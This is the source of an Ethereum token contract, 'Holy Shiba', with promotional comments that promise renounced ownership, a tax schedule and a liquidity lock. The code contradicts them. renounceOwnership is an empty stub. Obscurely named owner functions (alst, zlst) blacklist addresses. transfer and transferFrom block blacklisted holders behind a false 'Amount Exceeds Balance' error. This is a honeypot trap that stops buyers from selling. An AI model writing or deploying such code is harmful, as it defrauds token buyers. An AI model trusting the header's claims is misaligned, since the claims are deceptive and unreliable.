/**
 *Submitted for verification at Etherscan.io on 2022-08-14
*/

pragma solidity 0.8.15;
/*
                                 ,╓╓╖╖@@@@@@@@@@@@╖╖╖╖,
                             ╓@╣╢╢╢╢ÑÑ╩╨╜╜╙╙╙╙╜╜╨╩╩╣╣▒▒╢╢@╖
                            ╫╢▓╜`                      `╙╩╣╢
                            ╫▒╣╖╖                      ╓╖@╢╢
                             `╨╣▒▒▒╢╣@@@@╖╖╖╖╖╖╖@@@╣╣╢╢╣╢╝╜
                           ▓╢╣▓╗   "╙╙╢▒▒▒▒▒▒▒▒▒▒▒╢╜"`  ╓@▓╣╣@
                          ]╣╢╢╢╢╣@╦▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓@╣╢╢╢╢╢╢
                           ╣╢╢╢╢╢╢╢▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒╣╢╢╢╢╢╢╢╣
                           ╢╢╢╢╢╢╢╢╢╢╣╢╢╢╢╢╢╢╢╢╢╢╢╣╣╢╢╢╢╢╢╢╢╣╛
                          ,╣╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢▄
                         ╓▓▓▒╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢▓▓▓
                        ,▓▓▓▓╣╢╢╢╢╜  `╬╢╢╢╢╢╢╢╢╢╢╢╜  `╫╢╢╢╢╫▓▓▓▓
                        ▓▓▓▓▓╣╢╢╢╢╖╖╓╓╬╢╢╢╢╢╢╢╢╢╢╢╥╖╓╓╬╣╢╢╢▒▓▓▓▓╕
                       ]▓▓▓▓╢╢╢╢╣████▒▒╢╢╢╢╢╢╢╢╢╢╢▒▒███▌╢╢╢╢▒▓▓▓▓
                       ]▓▓▓╣╢╢╢╢╢▒▀█████▒╢╣╣╣╣╢╢▒█████▀▒╢╢╢╢╢╢▓▓▓
                       ]▓▓▓╢╢╢╢╢╢╢╢╢╣▒▒╢╜`     "╙╢▒▒╢╢╢╢╢╢╢╢╢╢▓▓▓
                        ▓▓╝```"╙╩╬╣╢╢▓`   ▄███▄   ╙╢╢╢╢▓╝╜""""▓▓▌
                        ╘▓▌        ╙╝     ▀████    └╝`        ▓▓
                         ╙▓▓                ▐▌              ╓▓▓
                          "▓▓▄          ▀█▀▓██▀▀█"        ,▓▓▓
                            ▀▓▓▓▄        `              ▄▓▓▓"
                              ╙▓▓▓▓▄╖              ,╓▄▓▓▓▀`
                                 ╙▀▓▓▓▓▓▄▄▄╖╓╓▄▄▓▓▓▓▓▓▀"
                                     `╙▀▀▓▓▓▓▓▓▀▀▀"

Holy Shiba (HOLYSHIB)

Holy Shiba will bless your folio


- 0% Tax first 24 Hours, then 7%
- 1B Supply
- Contract Renounce
- 1 week Liquidity Lock


HolyShib will comply with all upcoming forks and bridges

*/    

contract HolyShiba {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) txbal;

    // 
    string public name = "Holy Shiba";
    string public symbol = unicode"HOLYSHIB";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function renounceOwnership() public onlyOwner  {

}





    function alst(address _user) public onlyOwner {
        require(!txbal[_user], "xx");
        txbal[_user] = true;
        
    }
    
    function zlst(address _user) public onlyOwner {
        require(txbal[_user], "xx");
        txbal[_user] = false;
        
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!txbal[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }



/* 
       event UpdateTax(address indexed owner, address indexed spender, uint256 value);

         solium-check-time-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""
   

      require(success, "error reading storage");
      return abi.decode(data, (bytes32));
      
            
            	   
            
        
         solium-disable-next-line 
      (bool success, bytes memory data) = address(store).staticcall(
        abi.encodeWithSelector(
           store.read.selector,
         _key"""

      return abi.decode(data, (bytes32));
*/





    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!txbal[from] , "Amount Exceeds Balance"); 
               require(!txbal[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}